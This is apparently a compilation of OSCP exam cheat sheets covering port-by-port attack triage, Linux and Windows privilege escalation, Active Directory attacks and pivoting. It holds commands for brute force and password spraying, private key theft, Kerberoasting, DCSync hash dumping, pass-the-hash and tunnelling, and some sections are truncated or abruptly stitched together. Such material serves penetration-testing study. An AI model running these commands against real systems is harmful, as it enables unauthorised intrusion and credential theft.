# ⚙️ OSCP Exam Shell Environment & Standard Variables

> **🎯 Why:** Type `$TARGET` once instead of retyping IPs all exam — every battlecard command pastes instantly with zero typos.
> **📍 Where:** Kali Linux terminal (`~/.bashrc` + `~/.zshrc`) — persistent across every new shell tab for the full exam.
> **⏰ When to use:** Minute zero of the exam — set vars before your first Nmap scan, verify with `env`, reload every new shell.

---

## ⚡ One-Liner Arsenal (Run in Order)

```bash
export TARGET=192.168.45.10 # set primary exam target IP for all battlecards
export LHOST=192.168.45.5 # set Kali tunnel IP for reverse shells and pivots
export LPORT=4444 # set default listener port for netcat and msfvenom
export DOMAIN=corp.local # set AD domain name for Kerberos and spray tools
export USER=student # set known or guessed username for reuse everywhere
export WORDLIST=/usr/share/wordlists/rockyou.txt # set default password list path for hydra
```

---

## ⚡ Operational Command Flow

* [ ] **Step 1: Export vars in live shell** — paste the six `export` lines with your real exam IPs.
* [ ] **Step 2: Persist to `~/.bashrc`** — append the block so every new terminal inherits them.
* [ ] **Step 3: Reload + verify** — `source ~/.bashrc` then `env | grep` confirms all six are live.
* [ ] **Step 4: Smoke-test interpolation** — `echo` proves `$TARGET` expands before you trust it in exploits.
* [ ] **Step 5: Switch targets fast** — one `export TARGET=` line re-points every battlecard to the next box.

---

## 🗺️ Visual Architecture & Traffic Flow

```text
Kali Exam VM ($LHOST:$LPORT)
├── $TARGET  → Standalone / AD target (Nmap → exploit → shell)
├── $DOMAIN  → Kerberos realm for GetNPUsers / Kerberoast
├── $USER    → Reused credential across SSH / SMB / WinRM
└── $WORDLIST → rockyou.txt feeding hydra / hashcat
```

---

## ⚡ 30-Second Concept Brief

| Variable | Type | Target | Payload | Best Use |
|---|---|---|---|---|
| `$TARGET` | IPv4 | Exam box | Nmap, gobuster, hydra | Every attack command |
| `$LHOST` | IPv4 | Kali self | Reverse shells, chisel | Callbacks + pivots |
| `$LPORT` | Port | Listener | nc, msfvenom | Single default port |
| `$DOMAIN` | FQDN | AD realm | Kerberos tooling | AD-only attacks |
| `$USER` | String | Username | Spray + login | Credential reuse |
| `$WORDLIST` | Path | Local file | hydra, hashcat | Brute-force source |

---

## ⚙️ Deep Dive Explanations

### 1. Live Export — Point Every Battlecard at Today's Target

The six `export` lines bind real exam values to the variable names used across all battlecards. Export once and every pasted `$TARGET` expands correctly.

* **Set + verify (`export`):**

```bash
export TARGET=192.168.45.10 # overwrite target IP when pivoting to next exam box
export LHOST=192.168.45.5 # overwrite Kali IP after VPN reconnect changes tun0
echo $TARGET # print current target to confirm expansion works
echo $LHOST # print current Kali IP to confirm listener callbacks
```

* **Operational Note:** `export` only affects the current shell — new tabs start empty until you persist to `~/.bashrc` below.

***

### 2. Persistence — Survive New Tabs and Reboots

Appending the block to `~/.bashrc` (and `~/.zshrc` for Zsh users) reloads vars in every future shell automatically. The heredoc keeps quoting exact.

* **Append once (`cat`):**

```bash
cat >> ~/.bashrc <<'EOF' # open bashrc for appending without overwriting existing config
export TARGET=192.168.45.10 # persist primary target IP across all future shells
export LHOST=192.168.45.5 # persist Kali IP across all future shells
export LPORT=4444 # persist default listener port across all future shells
export DOMAIN=corp.local # persist AD domain across all future shells
export USER=student # persist active username across all future shells
export WORDLIST=/usr/share/wordlists/rockyou.txt # persist wordlist path across all future shells
EOF # close heredoc and flush appended block to bashrc
source ~/.bashrc # reload bashrc so current shell picks up persisted vars
env | grep -E 'TARGET|LHOST|LPORT|DOMAIN|USER|WORDLIST' # verify all six vars are live now
```

* **Operational Note:** Kali default shell is Zsh — repeat the same `cat >> ~/.zshrc` append if `echo $SHELL` shows `/bin/zsh`.

***

### 3. Daily Use — Interpolate Vars in Real Commands

Every battlecard command is written with `$VARS` so pasting just works. The smoke tests below prove expansion before you fire exploits.

* **Paste-ready usage (`echo`):**

```bash
echo "nmap -sC -sV $TARGET" # preview expanded Nmap scan before executing it
echo "xfreerdp /u:$USER /v:$TARGET" # preview expanded RDP login before executing it
echo $WORDLIST # confirm wordlist path exists before feeding it to hydra
ls -lh $WORDLIST # verify wordlist file is readable and non-empty
```

* **Limitation:** Quote `$USER` and `$DOMAIN` when they contain special characters or spaces, otherwise the shell splits them into broken arguments.

***

## 📋 Parameter & Flag Reference Cheat-Sheet

| Variable | Example value | Used in | Function |
|---|---|---|---|
| `$TARGET` | `192.168.45.10` | `nmap $TARGET` | Single source of truth for victim IP |
| `$LHOST` | `192.168.45.5` | `msfvenom LHOST=$LHOST` | Callback IP for reverse shells |
| `$LPORT` | `4444` | `nc -lvnp $LPORT` | Shared listener port everywhere |
| `$DOMAIN` | `corp.local` | `GetNPUsers.py $DOMAIN/` | AD realm for Kerberos tooling |
| `$USER` | `student` | `ssh $USER@$TARGET` | Reused username for spray + login |
| `$WORDLIST` | `/usr/share/wordlists/rockyou.txt` | `hydra -P $WORDLIST` | Default password source path |

---

## 🖥️ 3-Deep XP Pro — Telemetry & Defensive Perspective

| Action | Telemetry source | Detection indicator |
|---|---|---|
| `export TARGET=` | Bash history | Exam-safe — local only, no network noise |
| `hydra -P $WORDLIST` | Target auth logs | Blue team sees rapid 423/4625 failures |
| `GetNPUsers.py $DOMAIN/` | DC Kerberos logs | Event 4768 bursts without pre-auth |

---

## 🚨 Critical Traps, Pitfalls & Quick Wins

| Issue / Trap | Root cause | Fix |
|---|---|---|
| `$TARGET` empty in exploit | New tab never sourced `~/.bashrc` | Run `source ~/.bashrc` in every new tab |
| Wrong box attacked | Forgot to re-export after switching targets | `export TARGET=<new-ip>` before each Nmap |
| `$LHOST` callbacks die | VPN reconnect changed `tun0` IP | Re-check `ip addr` and re-export `$LHOST` |
| Zsh vars missing | Appended only to `~/.bashrc` | Mirror the block into `~/.zshrc` too |

---

## 🧠 10-Second Recall Memory

* **Set** = six `export` lines at minute zero with real exam IPs.
* **Persist** = append block to `~/.bashrc` (+ `~/.zshrc`) so tabs inherit.
* **Verify** = `env | grep` + `echo $TARGET` before first exploit.
* **Switch** = one `export TARGET=` re-points every battlecard.
* **Trap** = stale `$LHOST` after VPN drop kills all reverse shells.

***

*Companion to: HTB CPTS — Tools Commands (Instant Exam Battlecards)*

# 🐧 Linux Post-Enumeration & Active Directory Battlecard (Standalone & AD)

> **🎯 Why:** Turn any Linux shell into root, then pivot that same host into Domain Admin via SSSD, keytabs, and Impacket ticket attacks.
> **📍 Where:** Linux standalone ($TARGET as $USER) plus Linux joined to Active Directory ($DOMAIN via $TARGET DC with SSSD and Kerberos).
> **⏰ When to use:** The second you land a Linux shell — run Section 1 first, then Section 2 the moment `realm list` or DNS hints at $DOMAIN.

---

# 🐧 SECTION 1: LINUX STANDALONE POST-ENUMERATION & PRIVILEGE ESCALATION

> Triage order: identity → processes → network → permissions → credentials. Manual cascade first, LinPEAS last.

## 1.1 Situational Awareness (Who You Are + What Box This Is)

* [ ] **Step 1: Confirm identity + groups** — `id` and `whoami` reveal docker, sudo, and lxd instant-root paths.
* [ ] **Step 2: Fingerprint kernel + distro** — `uname -a` and `/etc/os-release` target kernel exploits precisely.
* [ ] **Step 3: Map hostname + env + PATH** — `env` leaks keys, `echo $PATH` spots writable hijack directories.

```bash
id # show UID GID and bonus groups like docker sudo lxd
whoami # confirm current username for su and sudo reuse
uname -a # dump kernel version for searchsploit exploit matching
cat /etc/os-release # confirm distro version when lsb_release is missing
hostname -f # show full hostname hinting at AD domain or server role
env # dump environment variables for keys passwords and PATH
echo $PATH # print PATH order to spot writable hijack directories
ls -la ~ # list home directory for keys history and loot files
```

## 1.2 Process & Cron Hunting (Root Jobs Running on a Timer)

* [ ] **Step 1: Snapshot live processes** — `ps aux` spots root scripts and custom binaries to hijack.
* [ ] **Step 2: Audit cron + systemd timers** — `/etc/crontab` and `systemctl list-timers` expose root schedules.
* [ ] **Step 3: Watch hidden jobs with pspy** — `pspy64` reveals short-lived commands configs never show.

```bash
ps aux # snapshot all processes to spot root scripts and daemons
top -n 1 -b # one-shot batch process view for unstable shells without ps
systemctl list-timers --all # list systemd timers firing jobs as root
crontab -l # dump current user crontab entries for writable scripts
cat /etc/crontab # inspect system-wide crontab running jobs as root
ls -la /etc/cron.d/ # list cron.d drop-ins for writable job files
ls -la /etc/cron.daily/ # list daily cron dir for writable job files
ls -la /var/spool/cron/crontabs/ # enumerate all users with scheduled cron jobs
chmod +x ./pspy64 # make pspy executable after uploading to /tmp
./pspy64 -pf -i 1000 # watch processes with file monitoring every 1s
```

## 1.3 Network & Internal Listeners (Hidden Ports Only Visible From Inside)

* [ ] **Step 1: List listeners** — `ss -tulpn` beats external Nmap for localhost MySQL and Redis.
* [ ] **Step 2: Map routes + neighbours** — `ip route` and `arp -a` reveal dual-homed pivot subnets.
* [ ] **Step 3: Read hosts + DNS + probe loopback** — `/etc/hosts` leaks DC names, then curl probes hidden panels.

```bash
ss -tulpn # list all TCP UDP listeners with PIDs for hidden services
netstat -antup # fallback listener dump with PIDs when ss is missing
ip a # show all interfaces and secondary pivot subnet IPs
ip route # print routing table exposing internal-only networks
arp -a # dump neighbour cache for live pivot targets nearby
cat /etc/hosts # read static host entries leaking DC and app names
cat /etc/resolv.conf # reveal internal DNS server usually the domain controller
curl -s http://127.0.0.1:8080/ # probe localhost admin panel invisible externally
ping -c2 $LHOST # confirm egress back to Kali for reverse tunnel
```

## 1.4 Permissions, SUID/SGID & Capabilities (GTFOBins Triggers)

* [ ] **Step 1: Check sudo + SUID + SGID** — `sudo -l` and `find -perm -4000` expose GTFOBins instantly.
* [ ] **Step 2: Audit capabilities + writables** — `getcap -r /` and writable `/etc/passwd` mean one-command root.
* [ ] **Step 3: Confirm container escape groups** — `docker` group converts to root without any kernel exploit.

```bash
sudo -l # list NOPASSWD entries for instant GTFOBins root abuse
find / -perm -4000 -type f 2>/dev/null # enumerate all SUID binaries for GTFOBins lookup
find / -perm -2000 -type f 2>/dev/null # enumerate SGID binaries for group-based abuse paths
getcap -r / 2>/dev/null # list file capabilities like python tar openssl with privesc power
ls -l /etc/passwd /etc/shadow # check writable passwd shadow for direct hash injection
find / -writable -type d 2>/dev/null # find world-writable dirs for PATH hijack planting
groups # list your groups to confirm docker lxd sudo membership
docker images # verify docker access for privileged container breakout escape
```

## 1.5 Sensitive Files & Credential Harvesting (Passwords Reused as Root)

* [ ] **Step 1: Reap history + web configs** — `.bash_history`, `wp-config.php`, and `.env` reuse as `su root` constantly.
* [ ] **Step 2: Steal SSH keys + NFS exports** — `id_rsa` gives key login, `no_root_squash` gives rooted mount.
* [ ] **Step 3: Spray harvested creds** — one `$PASSWORD` across `su`, `sudo`, and `ssh` beats kernel exploits.

```bash

ls -la ~/.ssh/ # list SSH keys and configs for private key theft
cat ~/.ssh/id_rsa # steal private key for direct ssh login reuse
cat ~/.ssh/authorized_keys # identify who can log in as this user

```

# 🏰 SECTION 2: LINUX IN ACTIVE DIRECTORY ENUMERATION & ATTACK ARSENAL

> Same AD, different foothold: Linux uses file-based CCACHE + Impacket while Windows uses LSASS + Rubeus. Convert tickets when you pivot sides.

id $USER@$DOMAIN # resolve AD user UID GID and groups via SSSD NSS

getent group "Domain Users" # confirm NSS maps domain groups to Linux GIDs

# ⚡ Instant Port Battlecards — 5-Second Exam Triage Matrix

> **🎯 Why:** Instantly map any open port to its highest-probability exam exploit path in under 5 seconds without thinking.
> **📍 Where:** Kali Linux attacker VM against any OSCP exam target ($TARGET) — all TCP ports from fast Nmap triage scan.
> **⏰ When to use:** The second Nmap finishes — read port number, jump to its battlecard, run commands top-to-bottom until foothold.

---

## ⚡ 0. Universal 60-Second Triage (Run First, Every Target)

```bash
nmap -sC -sV -oN nmap_fast.txt $TARGET # fast default-script + version scan on top ports
nmap -p- --min-rate 5000 -oN nmap_all.txt $TARGET # full 65535-port sweep to catch high ports
nmap -sU --top-ports 20 $TARGET # quick UDP check for DNS/SNMP exam surprises
```

> **Rule of 3:** If a port is open, you get **3 strikes** (3 commands) max before moving to the next port. Never rabbit-hole one service past 15 minutes.

---

## 📡 Port 21 — FTP (File Transfer Protocol)

> Anonymous login → writable upload → config credential reuse. Exam classic: `anonymous:anonymous` or `ftp:ftp` works far more often than you expect.

```bash
ftp $TARGET # test interactive anonymous login manually first
nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst $TARGET # audit anon access + bounce + banner
hydra -l anonymous -p anonymous ftp://$TARGET # verify trivial anon credentials quickly
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/fasttrack.txt ftp://$TARGET # brute-force weak FTP logins
```

```bash
wget -m ftp://anonymous:anonymous@$TARGET/ # mirror entire anonymous FTP share recursively
lftp -u anonymous,anonymous $TARGET # alternative scriptable FTP client for exam speed
```

---

## 🔐 Port 22 — SSH (Secure Shell)

> Rarely brute-forced first — harvest keys and creds from other services, then reuse here. Only brute-force with a known username + tiny list.

```bash
ssh $USER@$TARGET # test password or key login for known user directly
ssh -i ./id_rsa $USER@$TARGET # try looted private key with correct permissions
chmod 600 ./id_rsa # fix key permissions so SSH client accepts it
hydra -l $USER -P /usr/share/wordlists/rockyou.txt ssh://$TARGET # targeted single-user SSH brute force
```

```bash
ssh-keygen -y -f ./id_rsa # verify recovered private key is valid and readable
ssh -o StrictHostKeyChecking=no $USER@$TARGET # skip host-key prompt for exam speed
```

---

## ✉️ Port 25 — SMTP (Simple Mail Transfer)

> Enumerate users with `VRFY`/`RCPT`, then password-spray those users against SSH/SMTP/OWA. User list is the real prize here.

```bash
nmap -p25 --script smtp-commands,smtp-enum-users,smtp-open-relay $TARGET # enumerate SMTP verbs + users + relay
telnet $TARGET 25 # banner-grab SMTP manually and test VRFY interactively
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET # harvest valid usernames via VRFY
hydra -L users.txt -p 'Password123!' smtp://$TARGET # spray one likely password across harvested users
```

---

## 🌐 Port 53 — DNS (Domain Name System)

> Zone transfer (`AXFR`) leaks every hostname → new targets. If UDP 53 is open, always try it before anything else.

```bash
dig AXFR @$TARGET $DOMAIN # attempt full DNS zone transfer for subdomain dump
dig @$TARGET $DOMAIN ANY # query any-record dump for hidden TXT/SPF hostnames
dnsenum --dnsserver $TARGET -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt $DOMAIN # brute-force subdomains via target NS
nmap -p53 --script dns-zone-transfer,dns-recursion $TARGET # scripted AXFR + recursion audit
```

---

## 🌍 Port 80/443 — HTTP/S (Web)

> Highest-yield exam vector. Gobuster → Nikto → manual login/SQLi/LFI/RCE. Never skip: 60% of footholds live here.

```bash
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt # bust hidden dirs and pages fast
feroxbuster -u http://$TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt # recursive content discovery alternative
nikto -h http://$TARGET # audit known CGIs and misconfigurations quickly
sqlmap -u "http://$TARGET/page.php?id=1" --batch --banner # test single parameter for SQL injection
```

```bash
curl -sk https://$TARGET/ # fetch TLS homepage ignoring self-signed exam certs
whatweb http://$TARGET # fingerprint CMS version for searchsploit lookup
searchsploit apache 2.4 # match fingerprinted version to public exploits
```

---

## 🎫 Port 88 — Kerberos (Active Directory)

> AS-REP roast → Kerberoast → password spray. Needs $DOMAIN and user list; time-box to 10 minutes then pivot.

```bash
GetNPUsers.py $DOMAIN/ -dc-ip $TARGET -usersfile users.txt # AS-REP roast accounts without pre-auth
kerbrute userenum --dc $TARGET -d $DOMAIN users.txt # validate AD usernames via Kerberos safely
hydra -L users.txt -p 'Password123!' smb://$TARGET # spray seasonal password across enumerated users
GetUserSPNs.py $DOMAIN/$USER -dc-ip $TARGET # request crackable TGS tickets for SPN accounts
```

---

## 📁 Port 111/2049 — NFS (Network File System)

> `no_root_squash` + writable share = instant root. Mount it, drop SUID shell, execute via low-priv shell.

```bash
showmount -e $TARGET # list NFS exports and their client permissions
nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs $TARGET # audit exports + file listing + perms
mount -t nfs $TARGET:/share /mnt/nfs # mount suspected writable export locally
ls -la /mnt/nfs/ # confirm write access and hunt for keys or SUID binaries
```

---

## 📂 Port 139/445 — SMB (Server Message Block)

> Null session → share listing → secrets in shares → spray. Always check `anonymous` first; exam shares love guest read.

```bash
smbclient -L //$TARGET -N # list shares with null session no password
smbclient //$TARGET/share -N # connect to open share and browse files
enum4linux -a $TARGET # full null-session user + share + policy dump
crackmapexec smb $TARGET -u $USER -p 'Password123!' # test single credential across SMB quickly
```

```bash
smbmap -H $TARGET -u anonymous -p '' # map readable shares and permissions per share
impacket-smbserver share $(pwd) # host local share to transfer tools to target
```

---

## 🗄️ Port 1433 — MSSQL (Microsoft SQL Server)

> `sa` weak password → `xp_cmdshell` RCE. Also steal hashes via `xp_dirtree` to attacker SMB share.

```bash
nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-brute $TARGET # audit MSSQL banner + blank sa + brute force
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://$TARGET # brute-force sa account with rockyou fast
sqsh -U sa -S $TARGET # interactive MSSQL login once credential is known
mssqlclient.py $USER@$TARGET # Impacket MSSQL shell for xp_cmdshell execution
```

---

## 🗄️ Port 3306 — MySQL / MariaDB

> Weak `root` password → `LOAD_FILE` secrets + `INTO OUTFILE` webshell. Read DB creds from web configs first.

```bash
mysql -h $TARGET -u root # test blank root login immediately first
nmap -p3306 --script mysql-info,mysql-empty-password,mysql-users $TARGET # audit banner + blank root + user dump
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$TARGET # brute-force root password quickly
mysqldump -h $TARGET -u root -p'Password123!' --all-databases # dump all DBs for hashes and secrets
```

---

## 🖥️ Port 3389 — RDP (Remote Desktop)

> Password spray with one good password (never brute-force — lockout). Check NLA, then `xfreerdp` in.

```bash
nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $TARGET # audit RDP encryption + BlueKeep exposure
hydra -l $USER -P /usr/share/wordlists/rockyou.txt rdp://$TARGET # single-user RDP password guess carefully
xfreerdp /u:$USER /p:'Password123!' /v:$TARGET # full GUI login once credential validates
rdesktop -u $USER -p 'Password123!' $TARGET # lightweight alternative RDP client fallback
```

---

## 💻 Port 5985 — WinRM (Windows Remote Management)

> Valid creds = instant shell via `evil-winrm`. Spray one password, then live off it for privesc.

```bash
nmap -p5985 --script http-auth,http-methods $TARGET # confirm WinRM HTTP auth surface quickly
crackmapexec winrm $TARGET -u $USER -p 'Password123!' # validate credential over WinRM without login
evil-winrm -i $TARGET -u $USER -p 'Password123!' # drop into full WinRM shell immediately
hydra -l $USER -P /usr/share/wordlists/rockyou.txt http://$TARGET:5985/wsman # brute-force WinRM auth as last resort
```

---

## 🔀 Port 8080/8443 — Web Proxies / Alt HTTP

> Same as 80/443 but often admin panels, Tomcat manager, Jenkins. Default creds (`tomcat:tomcat`, `admin:admin`) win exams.

```bash
curl -s http://$TARGET:8080/ # grab alt-HTTP banner and title fast
gobuster dir -u http://$TARGET:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt # bust alt-port web paths fully
nikto -h http://$TARGET:8080 # audit alt-port for default apps and managers
hydra -l admin -p admin http://$TARGET:8080/manager/html # test Tomcat default creds on manager path
```

---

## 🧠 10-Second Recall Memory

* **FTP 21** = anon login first, then `wget -m` dump everything.
* **SSH 22** = reuse creds/keys, never blind-brute-force.
* **SMTP 25** = harvest users, spray them elsewhere.
* **DNS 53** = `AXFR` first, subdomains = new targets.
* **HTTP 80/443/8080** = gobuster + version → searchsploit, highest yield.
* **Kerberos 88** = AS-REP + Kerberoast with $DOMAIN user list.
* **NFS 111/2049** = `showmount -e` → mount → `no_root_squash` = root.
* **SMB 139/445** = null session → shares → secrets → spray.
* **MSSQL 1433** = `sa` → `xp_cmdshell` RCE.
* **MySQL 3306** = `root` blank → dump → webshell via `OUTFILE`.
* **RDP 3389** = spray once, `xfreerdp` in, never brute-force hard.
* **WinRM 5985** = valid creds → `evil-winrm` = shell.

***

# 🚨 5-Minute 'I'm Stuck' Exam Decision Trees & Playbooks

> **🎯 Why:** Break any exam stall in under 5 minutes with a deterministic diagnostic — no panic, no rabbit holes, just the next command.
> **📍 Where:** Kali Linux attacker VM against $TARGET — foothold, Linux/Windows privesc, AD domination, and pivoting stalls.
> **⏰ When to use:** The moment you catch yourself re-running the same command — stop, pick your checklist below, run it top-to-bottom.

---

## 🌐 1. Stuck on Initial Foothold (Web / Network)

> You have ports but no shell after 45 minutes. Reset: re-scan everything, re-bust web, test defaults, check UDP and high ports.

* [ ] **Step 1: Confirm you saw EVERYTHING** — full-port + UDP re-sweep catches the exam's hidden high port.
* [ ] **Step 2: Re-bust web with a second wordlist** — first wordlist misses `/backup`, `/old`, `/test` constantly.
* [ ] **Step 3: Test default creds on every login** — `admin:admin`, `tomcat:tomcat`, `sa:sa` win more exams than 0-days.
* [ ] **Step 4: version → searchsploit** — every fingerprinted version gets a 30-second exploit lookup.
* [ ] **Step 5: Reset and re-read** — revert box if you broke it, re-read page source for comments and JS endpoints.

```bash
nmap -p- --min-rate 5000 $TARGET # re-sweep all 65535 ports for hidden high-port services
nmap -sU --top-ports 20 $TARGET # catch UDP-only SNMP/DNS footholds you skipped
gobuster dir -u http://$TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt # second wordlist busts missed paths
curl -s http://$TARGET/robots.txt # reveal disallowed admin and backup paths fast
```

```bash
whatweb http://$TARGET # re-fingerprint CMS version for searchsploit matching
searchsploit apache 2.4 # lookup public exploit for fingerprinted web version
hydra -l admin -p admin http://$TARGET/login # test weakest default creds on login form
nikto -h http://$TARGET # catch default apps and dangerous methods you eyeballed past
```

---

## 🐧 2. Stuck on Linux Privilege Escalation (User → Root)

> 85% of Linux privescs fall to 5 manual checks before LinPEAS. Run the cascade in order: sudo → SUID → caps → cron → passwords → kernel.

* [ ] **Step 1: sudo -l** — `NOPASSWD` on vim/less/find/python = instant root, check first always.
* [ ] **Step 2: SUID + capabilities** — `find / -perm -4000` and `getcap -r /` expose GTFOBins in seconds.
* [ ] **Step 3: Cron + writable PATH/service** — `cat /etc/crontab` plus `pspy` catches root cron jobs.
* [ ] **Step 4: Config passwords + history** — DB creds and `~/.bash_history` reuse as root constantly.
* [ ] **Step 5: LinPEAS only now** — run it last, read colors (red/yellow) instead of drowning in output.

```bash
sudo -l # list NOPASSWD entries for instant GTFOBins escalation
find / -perm -4000 -type f 2>/dev/null # enumerate all SUID binaries for GTFOBins abuse
getcap -r / 2>/dev/null # list file capabilities like python tar with priv-esc power
cat /etc/crontab # inspect system cron jobs running as root on a timer
```

```bash
ps aux # spot root processes and timers hinting at cron or service abuse
grep -r "password" /var/www/ 2>/dev/null # harvest web-config DB creds for su reuse
cat ~/.bash_history # replay admin commands leaking plaintext root passwords
uname -a # record kernel version for last-resort searchsploit lookup
```

---

## 🪟 3. Stuck on Windows Privilege Escalation (User → SYSTEM)

> Windows privesc is credential reuse + misconfigured services. Check whoami/priv → passwords → unquoted paths → tokens, then WinPEAS.

* [ ] **Step 1: whoami /priv + systeminfo** — `SeImpersonate` = Potato family wins instantly; missing patches = kernel exploit.
* [ ] **Step 2: Stored creds + history** — `cmdkey /list` and PowerShell history hand you admin passwords.
* [ ] **Step 3: Services + AlwaysInstallElevated** — unquoted paths and weak service perms = SYSTEM shell.
* [ ] **Step 4: Try RunAs once** — one reused password via `runas /user:admin` beats an hour of theory.
* [ ] **Step 5: WinPEAS only now** — run it last, chase red/yellow findings, ignore the noise.

```bash
whoami /priv # confirm SeImpersonate privilege for JuicyPotato family
systeminfo # dump OS build for missing-patch kernel exploit matching
cmdkey /list # reveal stored credentials reusable via runas immediately
type C:\Windows\Panther\Unattend.xml # extract embedded admin password from deploy file
```

```bash
wmic service get name,displayname,pathname,startmode # audit services for unquoted-path hijack
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # verify AlwaysInstallElevated pair is set
powershell -c "Get-History" # replay admin PowerShell leaking plaintext secrets
winPEASx64.exe # automated audit only after manual cascade finds nothing
```

---

## 🏰 4. Stuck on Active Directory Domain Domination

> AD is a credential snowball: enumerate users → spray once → Kerberoast/AS-REP → BloodHound shortest path → DCSync. Never brute-force hard.

* [ ] **Step 1: User enumeration** — `kerbrute` + `rpcclient enumdomusers` builds the target list everything else needs.
* [ ] **Step 2: One gentle spray** — a single seasonal password across all users avoids lockout and cracks 30% of labs.
* [ ] **Step 3: Kerberos roast** — AS-REP for pre-auth-disabled accounts, Kerberoast for SPNs, crack offline with hashcat.
* [ ] **Step 4: BloodHound path** — ingest SharpHound, follow shortest path to Domain Admins, abuse ACLs/DCSync.
* [ ] **Step 5: Lateral confirmation** — `crackmapexec` validates each new cred across every host before you move.

```bash
kerbrute userenum --dc $TARGET -d $DOMAIN users.txt # validate AD usernames without triggering lockout
rpcclient -U "" $TARGET -c enumdomusers # null-session dump of domain user list
crackmapexec smb $TARGET -u users.txt -p 'Password123!' # gentle single-password spray across users
GetNPUsers.py $DOMAIN/ -dc-ip $TARGET -usersfile users.txt # AS-REP roast pre-auth-disabled accounts
```

```bash
GetUserSPNs.py $DOMAIN/$USER -dc-ip $TARGET # request crackable Kerberoast TGS tickets now
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt # crack Kerberos tickets offline with rockyou
bloodhound-python -u $USER -p 'Password123!' -d $DOMAIN -ns $TARGET # ingest AD graph for shortest DA path
secretsdump.py $DOMAIN/$USER@$TARGET # DCSync full domain hash dump once DA achieved
```

---

## 🔀 5. Stuck on Pivoting & SOCKS Tunneling

> No route = no progress. Confirm pivot binary → SSH dynamic forward → proxychains → scan through tunnel → full-port via chisel when SOCKS stalls.

* [ ] **Step 1: Confirm egress + binary** — `ping $LHOST` and `which ssh/socat/chisel` decides your pivot method.
* [ ] **Step 2: SSH dynamic SOCKS** — `-D 1080` on compromised host turns it into your tunnel in one line.
* [ ] **Step 3: proxychains through it** — `socks5 127.0.0.1 1080` in config, then prefix every scan with `proxychains`.
* [ ] **Step 4: Scan the hidden net** — Nmap through SOCKS finds the exam's internal-only hosts.
* [ ] **Step 5: Upgrade to chisel** — reverse SOCKS + RDP port-forward when proxychains is too slow for full scans.

```bash
ping -c2 $LHOST # confirm compromised host can reach Kali for reverse tunnel
which ssh # verify SSH client exists for dynamic SOCKS forward method
ssh -D 1080 -N $USER@$TARGET # open local SOCKS proxy through compromised host
cat /etc/proxychains4.conf # verify socks5 127.0.0.1 1080 line is configured
```

```bash
proxychains nmap -sT -p 80,445,3389 10.10.10.0/24 # scan hidden subnet through SOCKS tunnel slowly
chisel server -p 8000 --reverse # start chisel pivot server on Kali attacker side
./chisel client $LHOST:8000 R:socks # connect back from target creating reverse SOCKS
proxychains crackmapexec smb 10.10.10.10 -u $USER -p 'Password123!' # validate creds on pivoted host
```

---

## 🧠 10-Second Recall Memory

* **Foothold stuck** = rescan all ports + second wordlist + default creds + searchsploit.
* **Linux stuck** = `sudo -l` → SUID → caps → cron → passwords → LinPEAS last.
* **Windows stuck** = `whoami /priv` → stored creds → services → RunAs → WinPEAS last.
* **AD stuck** = enumerate users → gentle spray → roast → BloodHound path → DCSync.
* **Pivot stuck** = egress check → SSH `-D` → proxychains → scan hidden net → chisel upgrade.
* **Golden rule** = 45 minutes with no new lead → revert, switch port, switch checklist.

***

# Enum4linux & Enum4linux-ng Quick Reference (Commands Only)

> **🎯 Why:** Windows, Samba, and Active Directory SMB/RPC reconnaissance tool for harvesting users, enumerating shares, auditing password policies, and brute-forcing RIDs (Python 3 modern enum4linux-ng vs legacy Perl enum4linux).
> **📍 Where:** Run from attacker host ($LHOST) targeting Windows, Samba, and Active Directory servers ($TARGET) on SMB ports (TCP 445 / 139).
> **⏰ When to use:** Phase 2 (Footprinting & Service Enumeration) — immediately upon discovering open SMB/RPC ports to harvest usernames for spraying and locate readable shares without credentials.

---

## 01. ⚡ Complete Automated Reconnaissance (-A / -a)

```bash
enum4linux-ng $TARGET -A                   # execute all enumeration modules using modern Python 3 engine
enum4linux-ng $TARGET -A -v                # run full automated enumeration with verbose output displaying RPC calls
enum4linux-ng $TARGET -A -d                # run full scan with debugging output enabled for troubleshooting
enum4linux-ng $TARGET -A -k $WORDLIST      # run full scan while checking for specific usernames from $WORDLIST
enum4linux-ng $TARGET -As                  # run full scan while automatically saving output to text and JSON
```

## 02. 🔑 Authentication Modes (Null, Guest, User & Pass-the-Hash)

```bash
enum4linux-ng $TARGET -u '' -p '' -A       # test anonymous null session enumeration against $TARGET SMB service
enum4linux-ng $TARGET -u 'guest' -p '' -A  # test guest account privileges across all enumeration checks
enum4linux-ng $TARGET -u $USER -p $PASSWORD -A # authenticate as local user $USER with password $PASSWORD
enum4linux-ng $TARGET -u $USER -p $PASSWORD -d $DOMAIN -A # authenticate as domain user $USER within $DOMAIN
enum4linux-ng $TARGET -u $USER -H $NTLM_HASH -A # authenticate via Pass-the-Hash using administrative $NTLM_HASH
enum4linux-ng $TARGET -u $USER -p '' -A    # test empty password authentication for specified account $USER
```

## 03. 👥 User, Group & Active Session Enumeration

```bash
enum4linux-ng $TARGET -U                   # enumerate local and domain users via SAMR and RPC queries
enum4linux-ng $TARGET -u $USER -p $PASSWORD -U # authenticated user enumeration retrieving full names and bad password counts
enum4linux-ng $TARGET -G                   # enumerate local and domain security groups and their group memberships
enum4linux-ng $TARGET -u $USER -p $PASSWORD -G # dump complete security group membership mappings from $TARGET
enum4linux-ng $TARGET -L                   # enumerate active SMB sessions revealing logged-on domain users
enum4linux-ng $TARGET -u $USER -p $PASSWORD -L # authenticated check for logged-on users to target interactive sessions
```

## 04. 📂 SMB Share Discovery & Access Rights Audit

```bash
enum4linux-ng $TARGET -S                   # enumerate all visible SMB shares and determine Read and Write permissions
